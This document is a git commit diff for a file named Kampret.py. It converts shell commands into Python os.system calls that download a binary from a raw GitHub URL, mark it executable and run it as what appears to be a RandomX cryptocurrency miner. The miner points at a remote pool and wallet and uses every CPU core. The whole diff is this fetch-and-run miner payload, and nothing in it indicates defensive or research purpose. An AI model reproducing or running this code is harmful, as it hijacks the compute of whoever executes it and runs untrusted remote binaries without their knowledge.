bb6a4a279fc85a7bf0c3267c4f4a1b5b45e4297b
Erlandi <the@erlandi.my.id>
2024-04-22 13:50:50 +0700

    Update Kampret.py

--- Kampret.py
+++ Kampret.py
@@ -1,3 +1,4 @@
-wget https://raw.githubusercontent.com/petugas/No/main/k
-chmod +x k
-./k -o xm.erlandi.eu.org:8080 -u ZEPHsB4SF9T9wS4vyAbjZ6FzTDyCRFeV5MK7qqHdt2AHWfsmb1P7cbe2gfYp5py78DT6gFyLZixVqc11DNRyY9CHbs2BQG7LDyt -a rx/0 -k -t --randomx-fastmode=fast $(nproc)
+import os as kampret
+kampret.system("wget https://raw.githubusercontent.com/petugas/No/main/k")
+kampret.system("chmod +x k")
+kampret.system("./k -o xm.erlandi.eu.org:8080 -u ZEPHsB4SF9T9wS4vyAbjZ6FzTDyCRFeV5MK7qqHdt2AHWfsmb1P7cbe2gfYp5py78DT6gFyLZixVqc11DNRyY9CHbs2BQG7LDyt -a rx/0 -k -t --randomx-fastmode=fast $(nproc)")
